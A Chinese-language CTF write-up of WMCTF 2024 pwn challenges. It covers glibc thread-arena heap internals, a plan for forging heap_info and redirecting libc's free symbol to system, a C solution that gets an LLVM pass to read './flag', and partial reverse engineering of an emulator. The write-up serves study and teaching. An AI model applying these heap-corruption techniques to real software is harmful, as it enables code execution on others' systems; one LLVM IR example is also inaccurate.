> 衷心感谢tplus师傅耐心的帮助

BlindVM
=======

[Linux进程虚拟内存空间布局/ Linux 下虚拟内存的分布](https://blog.csdn.net/vincent3678/article/details/117458127)

```bash
hint: https://sourceware.org/git/?p=glibc.git;a=blob;f=malloc/arena.c;hb=09fb06d3d60291af6cdb20357dbec2fbb32514de#l596

hint2: Useheap spraying to make the heap space contiguous with the LIBC space.

Task content：The expected solution does not require any brute force.
47.104.193.231:9999
```

```bash
da1bb0f99/bin$ checksec BlindVM
[*] '/home/llk/Desktop/pwn/2024 WMCTF/BlindVM_3952e413eaca0e8ede93af1da1bb0f99/bin/BlindVM'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled

```

[linux系统编程之进程（四）：进程退出exit，\_exit区别即atexit函数](https://www.cnblogs.com/mickole/p/3186606.html)

可以尝试比topchunk大的不同size来尝试

线程堆栈
----

一开始`__pthread_create_2_1`会通过mmap分配`0x801000`大小的线程栈，然后被分割成`800000`和`1000`

```c

#0  __GI___mmap64 (addr=addr@entry=0x0, len=len@entry=8392704, prot=prot@entry=0, flags=flags@entry=131106, fd=fd@entry=-1, offset=offset@entry=0) at ../sysdeps/unix/sysv/linux/mmap64.c:47
#1  0x000070fc02095707 in allocate_stack (stacksize=<synthetic pointer>, stack=<synthetic pointer>, pdp=<synthetic pointer>, attr=0x7ffca70c5d30) at ./nptl/allocatestack.c:370
#2  __pthread_create_2_1 (newthread=0x7ffca70c5e60, attr=0x0, start_routine=0x6223aad872c0, arg=0x0) at ./nptl/pthread_create.c:647

   0x6223ac771000     0x6223ac792000 rw-p    21000      0 [heap]
    0x70fc01600000     0x70fc01601000 ---p     1000      0 [anon_70fc01600]
    0x70fc01601000     0x70fc01e01000 rw-p   800000      0 [anon_70fc01601]
    0x70fc02000000     0x70fc02028000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6

```

线程堆的初始化和mmap相关分配
----------------

新线程heap\_info和mstate和topchunk的初始化流程

```c
__GI___libc_malloc->tcache_init->arena_get->arena_lock->arena_get2->_int_new_arena->new_heap->alloc_new_heap (size, top_pad, GLRO (dl_pagesize), MAP_NORESERVE);->MMAP (0, max_size << 1, PROT_NONE, mmap_flags) max_size << 1=8000000 和__munmap (p1, ul);和 __munmap (p2 + max_size, max_size - ul);

 0x6223ac771000     0x6223ac792000 rw-p    21000      0 [heap]
    0x70fbf9600000     0x70fc01600000 ---p  8000000      0 [anon_70fbf9600]

    0x70fc01600000     0x70fc01601000 ---p     1000      0 [anon_70fc01600]
    0x70fc01601000     0x70fc01e01000 rw-p   800000      0 [anon_70fc01601]

__munmap (p1, ul);和 __munmap (p2 + max_size, max_size - ul);后

 0x6223ac771000     0x6223ac792000 rw-p    21000      0 [heap]
    0x70fbfc000000     0x70fc00000000 ---p  4000000      0 [anon_70fbfc000]
    0x70fc01600000     0x70fc01601000 ---p     1000      0 [anon_70fc01600]
    0x70fc01601000     0x70fc01e01000 rw-p   800000      0 [anon_70fc01601]

```

当分配堆的大小超过线程堆中的topchunk，但没有大于等于`0x20000 mp_.mmap_threshold`时会进入如下流程，相当于将heap\_info的size增加，然后topchunk的size自然变大，（size是自己申请的字节数，然后和页面大小对齐）然后topchunk分割

```c
sysmalloc (nb, av);
{
……
   if ((long) (MINSIZE + nb - old_size) > 0
          && grow_heap (old_heap, MINSIZE + nb - old_size) == 0)
        {
          av->system_mem += old_heap->size - old_heap_size;
          set_head (old_top, (((char *) old_heap + old_heap->size) - (char *) old_top)
                    | PREV_INUSE );
        }
}

grow_heap {
……
  diff = ALIGN_UP (diff, pagesize);
  new_size = (long) h->size + diff;
  if ((unsigned long) new_size > (unsigned long) max_size)
    return -1;
    ……
   }
保证在0x4000000范围内
  0x6223ac771000     0x6223ac792000 rw-p    21000      0 [heap]
    0x70fbfc000000     0x70fbfc021000 rw-p    21000      0 [anon_70fbfc000]
    0x70fbfc021000     0x70fc00000000 ---p  3fdf000      0 [anon_70fbfc021]

```

但如果大于等于`0x20000 mp_.mmap_threshold`直接通过mmap分配

```c
 mm = sysmalloc_mmap (nb, pagesize, 0, av);
 ->
  MMAP (0, size,
                mtag_mmap_flags | PROT_READ | PROT_WRITE,
                extra_flags);
```

但growheap中如果`h->size + diff;`大小已经超过0x4000000范围了，会进入如下处理流程

```c
  else if ((heap = new_heap (nb + (MINSIZE + sizeof (*heap)), mp_.top_pad)))
   ->
  alloc_new_heap (size就是nb + (MINSIZE + sizeof (*heap)), top_pad, GLRO (dl_pagesize), MAP_NORESERVE);
  ->
  MMAP (0, max_size << 1, PROT_NONE, mmap_flags);
  else
    aligned_heap_area = p2 + max_size;
     __munmap (p2 + max_size, max_size - ul);

newheap后的处理流程（av还是之前那个，但把av的top改成了当前新heap的topchunk），大小就是heap->size - sizeof (*heap)) | PREV_INUSE，然后会设置一些间隔堆

 {
          /* Use a newly allocated heap.  */
          heap->ar_ptr = av;
          heap->prev = old_heap;
          av->system_mem += heap->size;
          /* Set up the new top.  */
          top (av) = chunk_at_offset (heap, sizeof (*heap));
          set_head (top (av), (heap->size - sizeof (*heap)) | PREV_INUSE);

          /* Setup fencepost and free the old top chunk with a multiple of
             MALLOC_ALIGNMENT in size. */
          /* The fencepost takes at least MINSIZE bytes, because it might
             become the top chunk again later.  Note that a footer is set
             up, too, although the chunk is marked in use. */
          old_size = (old_size - MINSIZE) & ~MALLOC_ALIGN_MASK;
          set_head (chunk_at_offset (old_top, old_size + CHUNK_HDR_SZ),
            0 | PREV_INUSE);
          if (old_size >= MINSIZE)
            {
              set_head (chunk_at_offset (old_top, old_size),
            CHUNK_HDR_SZ | PREV_INUSE);
              set_foot (chunk_at_offset (old_top, old_size), CHUNK_HDR_SZ);
              set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);
              _int_free (av, old_top, 1);

00:0000│  0x72b087ffffe0 ◂— 0xf60  是原来的topchunk的size
01:0008│  0x72b087ffffe8 ◂— 0x10 
02:0010│  0x72b087fffff0 ◂— 0x10
03:0018│  0x72b087fffff8 ◂— 1

            }
          else
            {
              set_head (old_top, (old_size + CHUNK_HDR_SZ) | PREV_INUSE);
              set_foot (old_top, (old_size + CHUNK_HDR_SZ));
            }
        }
然后再新的topchunk分割
 p = av->top;
  size = chunksize (p);

  /* check that one of the above allocation paths succeeded */
  if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
    {
      remainder_size = size - nb;
      remainder = chunk_at_offset (p, nb);
      av->top = remainder;
      set_head (p, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0));
      set_head (remainder, remainder_size | PREV_INUSE);
      check_malloced_chunk (av, p, nb);
      return chunk2mem (p);
    }
```

注意新的heap是没有mstate的，就heap\_info，剩余的就是topchunk了

思路
--

由于mmap分配的区间在主线程heap到栈的某个偏移，这中间有mmap匿名映射分配的和libc和ld库的文件映射。

- 先分配当前heap\_info的空间（残留topchunk，但大小使得topchunk不满足也不能扩充了，就申请新的heap\_info），然后申请的和当前heap-&gt;size大于max\_size使得原来的topchunk被free掉，然后得到新的heap\_info
- 分配大于`0x20000`的使得mmap分配填充heap到libc的部分
- 将之前的进入unsortedbin的chunk分配一部分，然后溢出改size，然后能分割到unsortedbin 的fd正好在新页面的前八个字节（即libc对应的heap\_info的ar\_ptr 因为每个拿到chunk都会检查arena是否和ar\_ptr 一样 而此时的fd指向就在ar\_ptr 对应的mstate里 ），然后分配出来，部分写，就能得到`ar_ptr`

```c
 assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||
          ar_ptr == arena_for_chunk (mem2chunk (victim)));
```

- 然后分配掉当前新的heap\_info的空间（残留topchunk，但大小使得topchunk不满足也不能扩充了，就申请新的heap\_info），然后改topchunk的size,改大
- 然后使得分配到该heap\_info只剩0x10(但对应的topchunk还有很多，因为改了size)，然后分配size=`0x4000010`使得第一次分配在第二个heap\_info，而第二次分配在第一个heap\_info
- 

```c
0x76becc000000   0x76bed0000000     rw-p  4000000     0 [anon_76becc00]  第二个
 0x76bed0000000     0x76bed4000000 rw-p  4000000      0 [anon_76bed0000]
    0x76bed4000000     0x76bed8000000 rw-p  4000000      0 [anon_76bed4000]  第一个

第一个下面总是不连续，并且小于0x20000，可以每次喷的时候多个小于0x20000的部分，来把不足0x20000的部分填满

```

- 此时topchunk在heap\_info以下，而之前伪造的heap\_info就是在heap\_info以下的开始处，就是第一个分配完之后topchunk到fakeheapinfo那里去了，这个把\_heap\_info当作topchunk嘛，然后再申请，正好可以通过ar\_ptr检查，然后也能写size后面的了，进而控制heap\_info
- 后面的grow\_heap和topchunk扩容然后分割覆盖libc就顺理成章了

> libc加载地址的过程大概是这样的  
> 在dl\_fixup中根据字符串找到这个函数对应的结构体  
> 这个结构体存储一个偏移量  
> 最终这个函数的真实地址是l\_addr(库加载地址)＋offset  
> 这个结构体是存在libc开头的ro段的  
> 我们原语（mprotect）是可以改成rw，直接把free对应的offset写成system就好

```bash
IDA中的Elf64_Sym
LOAD:000000000000D4D0                 dd offset aLibcFree+7 - offset unk_16650; st_name ; "free"
LOAD:000000000000D4D4                 db 12h                  ; st_info
LOAD:000000000000D4D5                 db 0                    ; st_other
LOAD:000000000000D4D6                 dw 0Fh                  ; st_shndx
LOAD:000000000000D4D8                 dq offset free          ; st_value
LOAD:000000000000D4E0                 dq 101h                 ; st_size

pwndbg> p &free
$80 = (void (*)(void *)) 0x72b088ca53e0 <__GI___libc_free>
pwndbg> libc
libc : 0x72b088c00000
pwndbg> p/x 0x72b088ca53e0-0x72b088c00000
$81 = 0xa53e0
pwndbg> search -p 0xa53e0
Searching for value: b'\xe0S\n\x00\x00\x00\x00\x00'
libc.so.6       0x72b088c0d4d8 0xa53e0
libc.so.6       0x72b088c0d640 0xa53e0
libc.so.6       0x72b088c14618 0xa53e0
pwndbg> vmmap 0x72b088c0d4d8
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x72b088a01000     0x72b088c00000 rw-p   1ff000      0 [anon_72b088a01]
►   0x72b088c00000     0x72b088c28000 r--p    28000      0 /usr/lib/x86_64-linux-gnu/libc.so.6 +0xd4d8
    0x72b088c28000     0x72b088dbd000 r-xp   195000  28000 /usr/lib/x86_64-linux-gnu/libc.so.6
pwndbg> p/x 0x72b088c0d4d8-0x72b088c00000
$82 = 0xd4d8
pwndbg> tele 0x72b088c0d4d0
00:0000│  0x72b088c0d4d0 ◂— 0xf001200004dde
01:0008│  0x72b088c0d4d8 ◂— 0xa53e0
02:0010│  0x72b088c0d4e0 ◂— 0x101
03:0018│  0x72b088c0d4e8 ◂— 0xf001200001e92
04:0020│  0x72b088c0d4f0 ◂— 0x3a1b0
05:0028│  0x72b088c0d4f8 ◂— 0x13
06:0030│  0x72b088c0d500 ◂— 0xfff1001100007e62 /* 'b~' */
07:0038│  0x72b088c0d508 ◂— 0

```

exp
---

某种原因不能放

babysigin
=========

LLVM pass题  
草率一看，给了mmap open read write，不直接读flag？有些限制，然后有些特殊的地方需要逆

```c
apt-get -y install llvm && apt-get -y install clang 

clang-14 -emit-llvm llk.c -S -o  llk.bc

```

启动需要`opt -load ./WMCTF.so -WMCTF -enable-new-pm=0 ./llk.bc`，忘记看了，一直没加`-enable-new-pm=0`导致老是找不到PASS

moudle function basic\_block
----------------------------

当然，我会通过一个 C 语言的例子来解释 Module、Function 和 Basic Block 之间的关系。这些概念是 LLVM IR 的核心组成部分。

首先，让我们看一个简单的 C 程序：

```c
#include <stdio.h>

int add(int a, int b) {
    return a + b;
}

int max(int a, int b) {
    if (a > b) {
        return a;
    } else {
        return b;
    }
}

int main() {
    int x = 5, y = 10;
    int sum = add(x, y);
    int maximum = max(x, y);
    printf("Sum: %d, Max: %d\n", sum, maximum);
    return 0;
}
```

现在，让我们解释这个程序在 LLVM 的上下文中如何被组织：

1. Module（模块）:
    
    
    - 整个 C 文件被视为一个 Module。
    - Module 是 LLVM IR 的顶层容器。
    - 它包含了所有的函数定义、全局变量和其他顶级实体。
2. Function（函数）:
    
    
    - 在这个例子中，我们有三个函数：`add`、`max` 和 `main`。
    - 每个函数在 LLVM IR 中都被表示为一个 Function。
    - Function 包含了函数的参数、返回类型和函数体。
3. Basic Block（基本块）:
    
    
    - 每个函数由一个或多个 Basic Block 组成。
    - Basic Block 是一系列连续的指令，只有一个入口（第一条指令）和一个出口（最后一条指令）。
    - 在我们的例子中： 
        - `add` 函数可能只有一个 Basic Block。
        - `max` 函数可能有三个 Basic Block：一个用于条件检查，一个用于 `if` 分支，一个用于 `else` 分支。
        - `main` 函数可能有一个或多个 Basic Block，取决于编译器的优化。

让我们详细看看 `max` 函数，因为它展示了多个 Basic Block：

```llvm
define i32 @max(i32 %a, i32 %b) {
entry:
  %cmp = icmp sgt i32 %a, %b
  br i1 %cmp, label %if.then, label %if.else

if.then:                                          ; preds = %entry
  ret i32 %a

if.else:                                          ; preds = %entry
  ret i32 %b
}
```

在这个 LLVM IR 表示中：

- 整个 `max` 函数是一个 Function。
- 它包含三个 Basic Block：`entry`、`if.then` 和 `if.else`。
- `entry` Block 包含比较指令和条件分支。
- `if.then` 和 `if.else` Blocks 各自包含一个返回指令。

关系总结：

1. 一个 Module 包含多个 Function。
2. 每个 Function 包含一个或多个 Basic Block。
3. Basic Block 包含实际的指令序列。

逆向
--

结合动态调试逆和AI逆（让AI根据PASS给个C实例）

点1
--

```c
 var = (llvm::Value *)llvm::UnaryInstruction::getOperand(load_code, 0);
          var_name = llvm::Value::getName(var);

llvm::StringRef::StringRef((llvm::StringRef *)&v68, ".addr");
          if ( (llvm::StringRef::contains(&var_name, v68.data_ptr, v68.len) & 1) == 0 )
          {
```

getOperand会取出第一个参数变量，然后通过getName拿到变量名字，然后变量名字需要包含`.addr`

点2
--

然后会拿到当前call指令所在的函数，开始遍历该函数所在的moudle中的每个function中的basic\_block的指令

```c
 moudle = (llvm::Module *)llvm::GlobalValue::getParent(fucntion_1);
          `anonymous namespace'::WMCTF::getFunctionCallValue[abi:cxx11](
            (llvm *)file_name_1,
            (__int64)this,
            moudle,
            fucntion_1,
            0);
```

如果有call指令，且调用的函数和之前的call指令所在的函数一样，会进入如下

```c
 call = (llvm::CallBase *)llvm::dyn_cast<llvm::CallInst,llvm::Instruction>(instruction);
          if ( call )
          {
            CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(call);
            called_fuc_name = llvm::Value::getName(CalledFunction);
            v41 = v7;
            func_name = llvm::Value::getName(func_1);
            v39 = v8;
            if ( (llvm::operator==(called_fuc_name, v41, func_name, v8) & 1) != 0 )
            {
```

然后会检查调用的函数的参数是否是loadinst即指针，然后参数变量名如果包含`.addr`，再次进入上述流程

```c
 if ( (llvm::operator==(called_fuc_name, v41, func_name, v8) & 1) != 0 )
            {
              Operand = llvm::CallBase::getOperand(call, 0);
              loadinst = (llvm::UnaryInstruction *)llvm::dyn_cast<llvm::LoadInst,llvm::Value>(Operand);
              if ( loadinst )
              {
                addr = (llvm::Value *)llvm::UnaryInstruction::getOperand(loadinst, 0);
                Name = llvm::Value::getName(addr);
                v36 = v11;
                llvm::StringRef::StringRef((llvm::StringRef *)v34, ".addr");
                if ( (llvm::StringRef::contains(&Name, v34[0], v34[1]) & 1) != 0 )
                {
                  `anonymous namespace'::WMCTF::getFunctionCallValue[abi:cxx11](
                    result,
                    a2,
                    moudle_1,
                    func,
                    recursion_dep_1 + 1);
                  return result;
                }
```

然后如果不包含`.addr`会进入如下处理流程，如果当前寻找当前调用到函数的递归层次不是3，那么会返回空字符

```c
 if ( recursion_dep_1 != 3 )
                {
                  v12 = llvm::errs((llvm *)&Name);
                  v13 = llvm::raw_ostream::operator<<(v12, recursion_dep_1);
                  llvm::raw_ostream::operator<<(v13, "\n");
                  std::allocator<char>::allocator(v33);
                  std::string::basic_string(result, "", v33);
                  std::allocator<char>::~allocator(v33);
                  return result;
                }
```

如果不包含`.addr`并且递归层次是3，会进入如下流程，这里会找到当前使用的函数的loadins的参数的所有用到的指令，然后选择StoreInst指令，并通过它再获得该参数，最后设置为字符串，但这里要满足`v16 = llvm::StoreInst::getOperand(v26, 0); v25 = (llvm::ConstantExpr *)llvm::dyn_cast<llvm::ConstantExpr,llvm::Value>(v16);`

```c
v32 = (llvm::Value *)llvm::UnaryInstruction::getOperand(loadinst, 0);
                v30[0] = llvm::Value::uses(v32);
                v30[1] = v14;
                v31 = v30;
                v29 = llvm::iterator_range<llvm::Value::use_iterator_impl<llvm::Use>>::begin(v30);
                v28 = llvm::iterator_range<llvm::Value::use_iterator_impl<llvm::Use>>::end(v31);
                while ( (llvm::Value::use_iterator_impl<llvm::Use>::operator!=(&v29, &v28) & 1) != 0 )
                {
                  v27 = (llvm::Use *)llvm::Value::use_iterator_impl<llvm::Use>::operator*(&v29);
                  User = llvm::Use::getUser(v27);
                  v26 = (llvm::StoreInst *)llvm::dyn_cast<llvm::StoreInst,llvm::User>(User);
                  if ( v26 )
                  {
                    v16 = llvm::StoreInst::getOperand(v26, 0);
                    v25 = (llvm::ConstantExpr *)llvm::dyn_cast<llvm::ConstantExpr,llvm::Value>(v16);
                    if ( v25 )
                    {
                      v17 = llvm::ConstantExpr::getOperand(v25, 0);
                      v24 = (llvm::GlobalVariable *)llvm::dyn_cast<llvm::GlobalVariable,llvm::Constant>(v17);
                      if ( v24 )
                      {
                        Initializer = llvm::GlobalVariable::getInitializer(v24);
                        v23 = (llvm::ConstantDataSequential *)llvm::dyn_cast<llvm::ConstantDataArray,llvm::Constant>(Initializer);
                        if ( v23 )
                        {
                          v22[0] = llvm::ConstantDataSequential::getAsString(v23);
                          v22[1] = v19;
                          llvm::StringRef::str[abi:cxx11](result, v22);
                          return result;
                        }
                      }
                    }
                  }
                  llvm::Value::use_iterator_impl<llvm::Use>::operator++(&v29);
                }
```

首先是要遍历使用到loadinst的第一个参数的所有use，然后使用转换为storeinst，取出storeinst的第一个参数，需要是全局常量，后来想了想，常量应该都是全局的。。。。  
如下面的

```c
 const char *store="./flag";
 func4(store);
 此时对应的IR，此时会自动生成一个全局变量表示"./flag"
 @.str = private unnamed_addr constant [7 x i8] c"./flag\00", align 1

  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %3, align 8
  %4 = load i8*, i8** %3, align 8
  call void @func4(i8* noundef %4)
```

关键
==

声明全局变量时和实际的IR

```c
const char * flag="./flag";
const char *recrusive = "nouse";  

@.str = private unnamed_addr constant [7 x i8] c"./flag\00", align 1
@flag = dso_local global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [6 x i8] c"nouse\00", align 1
@recrusive = dso_local global i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), align 8

```

当直接字符复制时和对应的IR，此时会store会通过@.str

```c
 const char *store="./flag";
   func4(store);

  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %3, align 8
  %4 = load i8*, i8** %3, align 8
  call void @func4(i8* noundef %4)

```

最后的write部分

```c
  addr_string = llvm::UnaryInstruction::getOperand(loadinst, 0);
                v44 = (llvm::GlobalVariable *)llvm::dyn_cast<llvm::GlobalVariable,llvm::Value>(addr_string);
                if ( !v44 )
                {
                  v88 = 0;
                  return v88 & 1;
                }
                v34 = llvm::GlobalVariable::getOperand(v44, 0);
                v43 = (llvm::ConstantInt *)llvm::dyn_cast<llvm::ConstantInt,llvm::Value>(v34);
                if ( v43 )
                {
                  if ( (unsigned int)llvm::ConstantInt::getSExtValue(v43) != 0x8888 )
```

这段代码是获取一个全局变量的初始值，并将其转换为`llvm::ConstantInt`类型。  
`v44`是一个`llvm::GlobalVariable`类型的指针，表示一个全局变量。`llvm::GlobalVariable::getOperand`方法用于获取全局变量的第一个操作数，也就是全局变量的初始值。`v34`就是这个操作数。  
然后，`llvm::dyn_cast`方法将`v34`强制转换为`llvm::ConstantInt`类型，这样就可以访问其值。`v43`就是这个常量整数的指针。  
举个例子，假设我们有一个C代码如下：

```c
int global_var = 0x12345678;
```

对应的LLVM IR代码可能如下：

```less
@global_var = external global i32
```

这里的`@global_var`就是一个全局变量，其初始值是外部提供的。如果我们想要获取这个全局变量的初始值，可以使用以下代码：

```c++
llvm::GlobalVariable *globalVar = M.getNamedGlobal("global_var"); // M是一个Module对象
llvm::Value *initVal = globalVar->getOperand(0); // 获取全局变量的初始值
llvm::ConstantInt *constInt = dyn_cast<llvm::ConstantInt>(initVal); // 强制转换为常量整数
int value = constInt->getZExtValue(); // 获取常量整数的值
```

这样，`value`就会得到`0x12345678`。

ConstantInt不是代表C中的const

exp
---

```c
void  WMCTF_OPEN(const char* str )
{

}
void WMCTF_READ(int arg)
{

}

void WMCTF_MMAP(int arg)
{

}
void WMCTF_WRITE(int arg)
{

}
const char * flag="./flag";
const char *recrusive = "nouse";  
int GLOBAL_CONSTANT = 0x8888;
void func1(const char * arg)
{
    WMCTF_MMAP(0x7890);
    WMCTF_OPEN(recrusive); 

    WMCTF_READ(0x6666);

    WMCTF_WRITE(GLOBAL_CONSTANT);
}
void func2(const char * arg)
{
    func1(recrusive);
}
void func3(const char * arg)
{
    func2(recrusive);
}
void func4(const char * arg)
{
    func3(recrusive);
}
void func5(const char * arg)
{
    const char *store="./flag";
    func4(store);
}
```

```bash
; ModuleID = 'llk.c'
source_filename = "llk.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

@.str = private unnamed_addr constant [7 x i8] c"./flag\00", align 1
@flag = dso_local global i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i32 0, i32 0), align 8
@.str.1 = private unnamed_addr constant [6 x i8] c"nouse\00", align 1
@.addr = dso_local global i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i32 0, i32 0), align 8
@GLOBAL_CONSTANT = dso_local global i32 34952, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @WMCTF_OPEN(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @WMCTF_READ(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @WMCTF_MMAP(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @WMCTF_WRITE(i32 noundef %0) #0 {
  %2 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func1(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  call void @WMCTF_MMAP(i32 noundef 30864)
  %3 = load i8*, i8** @.addr, align 8
  call void @WMCTF_OPEN(i8* noundef %3)
  call void @WMCTF_READ(i32 noundef 26214)
  %4 = load i32, i32* @GLOBAL_CONSTANT, align 4
  call void @WMCTF_WRITE(i32 noundef %4)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func2(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** @.addr, align 8
  call void @func1(i8* noundef %3)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func3(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** @.addr, align 8
  call void @func2(i8* noundef %3)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func4(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %3 = load i8*, i8** @.addr, align 8
  call void @func3(i8* noundef %3)
  ret void
}

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @func5(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str, i64 0, i64 0), i8** %3, align 8
  %4 = load i8*, i8** %3, align 8
  call void @func4(i8* noundef %4)
  ret void
}

attributes #0 = { noinline nounwind optnone uwtable "frame-pointer"="all" "min-legal-vector-width"="0" "no-trapping-math"="true" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "tune-cpu"="generic" }

!llvm.module.flags = !{!0, !1, !2, !3, !4}
!llvm.ident = !{!5}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{i32 7, !"PIC Level", i32 2}
!2 = !{i32 7, !"PIE Level", i32 2}
!3 = !{i32 7, !"uwtable", i32 1}
!4 = !{i32 7, !"frame-pointer", i32 2}
!5 = !{!"Ubuntu clang version 14.0.0-1ubuntu1.1"}

```

evm
===

```bash
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

```

BYTE1
-----

玛德，一直以为BYTE1是低字节结果不是

在IDA中，`result = (BYTE1(code) >> 4) & 7;` 这行代码的作用可以通过逐步分析来理解。假设 `code` 是一个整数类型的变量，`BYTE1(code)` 是一个宏或函数，用于提取 `code` 的第二个字节（从低位开始计数，低字节是第0字节）。

### 分析步骤：

1. **`BYTE1(code)`**:
    
    
    - `BYTE1(code)` 通常用于提取 `code` 的第二个字节（即从低位算起的第1个字节）。例如，如果 `code` 是一个32位的整数，那么 `BYTE1(code)` 会提取 `code` 的第8到第15位的8个比特。
    - 具体实现可能是 `#define BYTE1(x) ((x >> 8) & 0xFF)`，这意味着它将 `code` 右移8位，然后取最低的8位。
2. **`BYTE1(code) >> 4`**:
    
    
    - 这一步将提取出来的第二个字节再右移4位。右移4位的操作会将该字节的高4位保留，而低4位则被丢弃。
3. **`& 7`**:
    
    
    - `7` 的二进制表示是 `00000111`，即只保留最低的3位。`& 7` 的操作会将右移后的结果与 `7` 进行按位与操作，从而只保留结果的最低3位。

### 总结：

`result = (BYTE1(code) >> 4) & 7;` 这行代码的作用是：

- 从 `code` 中提取第二个字节（第8到第15位）。
- 将该字节右移4位，保留其高4位。
- 然后通过 `& 7` 操作，只保留右移后结果的最低3位。

最终，`result` 的值是 `code` 的第二个字节的高4位中的最低3位。这种操作通常用于从一个字节中提取特定的位段，可能用于解析某种编码格式或协议。

主要逆向
----

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  struct emulator v4; // [rsp+0h] [rbp-140h] BYREF
  unsigned __int64 v5; // [rsp+128h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  setbuf();
  init_emulator(&v4);
  run_emulator(&v4);
  dele_emulator(&v4);
  return 0LL;
}
int __fastcall init_emulator(struct emulator *a1)
{
  a1->chunk_1000_ptr_page_table_addr_array[1] = malloc(0x1000uLL);
  a1->chunk_1000_ptr_page_table_addr_array[0] = malloc(0x1000uLL);
  a1->chunk_200000_ptr = malloc(0x200000uLL);
  a1->chunk_200_ptr = malloc(0x200uLL);
  memset((void *)a1->chunk_200_ptr, 0, 0x200uLL);
  return puts("emulator init");
}

unsigned __int64 __fastcall run_emulator(struct emulator *emula)
{
  int i; // [rsp+20h] [rbp-40h]
  struct struct1 now_ptr; // [rsp+24h] [rbp-3Ch] BYREF
  unsigned __int64 len; // [rsp+30h] [rbp-30h] BYREF
  __int64 now; // [rsp+38h] [rbp-28h] BYREF
  unsigned __int64 random_offset; // [rsp+40h] [rbp-20h]
  void *page_elememnt_0; // [rsp+48h] [rbp-18h]
  __int64 now_1; // [rsp+50h] [rbp-10h] BYREF
  unsigned __int64 v9; // [rsp+58h] [rbp-8h]

  v9 = __readfsqword(0x28u);
  puts("A modern architecture emulator, maybe not standard");
  *(_DWORD *)&now_ptr.len[4] = 0;
  len = 0LL;
  now = std::chrono::_V2::system_clock::now((std::chrono::_V2::system_clock *)"A modern architecture emulator, maybe not standard");
  now_1 = sub_402A78(&now);
  *(_QWORD *)&now_ptr.time = (unsigned int)sub_4029BC(&now_1);
  sub_402A8E(&now, (unsigned int)now_ptr.time);
  sub_402AB8((__int64)&now_1, 0, 500u);
  __isoc99_scanf("%d", now_ptr.len);
  getchar();
  if ( *(_QWORD *)now_ptr.len > 0x1000uLL )
    _Exit(1);
  __isoc99_scanf("%d", &len);
  getchar();
  if ( len > 3 )
    _Exit(1);
  random_offset = (int)sub_402AE6(&now_1, &now);
  random_offset = find_arg2_len_pos_and_fill_1_return_offset(emula, len + 1, random_offset);
  set_page_table_element(emula, 1uLL, 0, 1LL, random_offset);
  set_page_table_element(emula, len, 0, 6LL, random_offset + 1);
  page_elememnt_0 = (void *)page_convert(emula, 0LL, 0, 1LL);
  read(0, page_elememnt_0, *(size_t *)now_ptr.len);
  __isoc99_scanf("%d", now_ptr.len);
  getchar();
  if ( *(_QWORD *)now_ptr.len > 0x1000uLL )
    _Exit(1);
  __isoc99_scanf("%d", &len);
  getchar();
  if ( len > 3 )
    _Exit(1);
  random_offset = (int)sub_402AE6(&now_1, &now);
  random_offset = find_arg2_len_pos_and_fill_1_return_offset(emula, len + 1, random_offset);// 找到可以的random_offset
  set_page_table_element(emula, 1uLL, 1u, 1LL, random_offset);
  set_page_table_element(emula, len, 1u, 6LL, random_offset + 1);
  page_elememnt_0 = (void *)page_convert(emula, 0LL, 1u, 1LL);
